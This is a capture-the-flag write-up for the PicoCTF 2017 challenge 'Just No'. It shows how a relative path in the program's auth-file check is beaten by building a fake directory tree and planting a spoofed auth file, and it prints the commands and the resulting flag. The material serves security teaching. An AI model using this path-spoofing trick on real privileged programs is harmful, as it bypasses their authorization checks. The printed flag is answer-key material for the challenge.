# PicoCTF_2017: Just No

**Category:** Binary Exploitation
**Points:** 40
**Description:**

>A program at /problems/7e8b456c98db60be9a33339ab4509fca has access to a flag but refuses to share it. Can you convince it otherwise?

**Hint:**

>Check out the difference between relative and absolute paths and see if you can figure out how to use them to solve this challenge. Could you possibly spoof another auth file it looks at instead...?

## Write-up
Hmm, let's get the flag.

    $ /problems/7e8b456c98db60be9a33339ab4509fca/justno
    auth file says no. So no. Just... no. 

Damn it. Let's take a look at the [source code](just-no.c). Wait.

    FILE* authf = fopen("../../problems/7e8b456c98db60be9a33339ab4509fca/auth","r")

Haha! Relative paths! Now we can simply spoof a directory structure and make a fake auth file.

    $ cd ~
    $ mkdir problems
    $ mkdir problems/7e8b456c98db60be9a33339ab4509fca
    $ cd problems/7e8b456c98db60be9a33339ab4509fca
    $ echo "yes" > auth
    $ /problems/7e8b456c98db60be9a33339ab4509fca/justno
    Oh. Well the auth file doesn't say no anymore so... Here's the flag: ddf649b13d560409d2649dc06f2a43ee

Therefore, the flag is `ddf649b13d560409d2649dc06f2a43ee`.
